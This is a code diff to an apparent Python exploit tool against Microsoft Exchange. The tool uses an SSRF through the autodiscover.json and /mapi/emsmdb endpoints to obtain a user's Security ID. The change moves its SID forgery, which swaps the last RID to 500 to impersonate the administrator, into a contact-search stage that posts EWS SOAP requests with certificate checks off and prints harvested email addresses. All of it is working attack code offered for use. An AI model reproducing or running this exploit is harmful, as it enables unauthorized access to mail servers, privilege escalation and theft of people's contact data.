@@ -40,7 +40,7 @@ def GetLegacyDN(target,email):
     return legacyDn
 
 
-def GetSID(target, legacyDn,sidfix=False):
+def GetSID(target, legacyDn):
     logger.debug("[Stage 2] Performing malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against " + target)
 
     # Malformed MAPI body
@@ -64,13 +64,6 @@ def GetSID(target, legacyDn,sidfix=False):
         exit()
 
     sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]
-    if sidfix:
-        if sid.split("-")[-1] != "500":
-            logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
-            base_sid = sid.split("-")[:-1]
-            base_sid.append("500")
-            sid = "-".join(base_sid)
-
     logger.debug("[Stage 2] Successfully obtained SID: " + sid)
     return sid
 
@@ -134,9 +127,32 @@ def SearchContact(target,sid,keyword):
         )
     # If status code 200 is NOT returned, the request failed
     if stage888.status_code != 200:
-        logger.error("[Stage 999] Request failed - Brute Account Error!")
+        logger.error("[Stage 999] Request failed - Search Contactt Error!")
+        exit()
+    if "No results were found" in stage888.content.decode():
+        logger.warning("No results were found, try fix sid")
+        if sid.split("-")[-1] != "500":
+            logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
+            base_sid = sid.split("-")[:-1]
+            base_sid.append("500")
+            sid = "-".join(base_sid)
+    soap_body = convertFromTemplate({'sid':sid,'keyword':keyword},templatesFolder + "SearchContact.xml")
+    stage888 = requests.post(
+        f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
+            "Content-Type": "text/xml",
+            "User-Agent": user_agent,
+            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                            },
+        data=soap_body,
+        verify=False
+        )
+    # If status code 200 is NOT returned, the request failed
+    if stage888.status_code != 200:
+        logger.error("[Stage 999] Request failed - Search Contact Error!")
         exit()
     folderXML = ET.fromstring(stage888.content.decode())
+    if "No results were found" in stage888.content.decode():
+        logger.warning("No results were found")
     for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
         print(item.text)
 
@@ -362,7 +378,7 @@ if __name__ == '__main__':
 
     elif args.target and args.email and args.action == "SearchC" and args.keyword:
         legacyDn = GetLegacyDN(args.target, args.email)
-        sid = GetSID(args.target, legacyDn,sidfix=True)
+        sid = GetSID(args.target, legacyDn)
         contactinfo = SearchContact(args.target, sid, args.keyword)
         
     elif args.target and args.email and args.action == "SearchM" and args.folder and args.keyword:
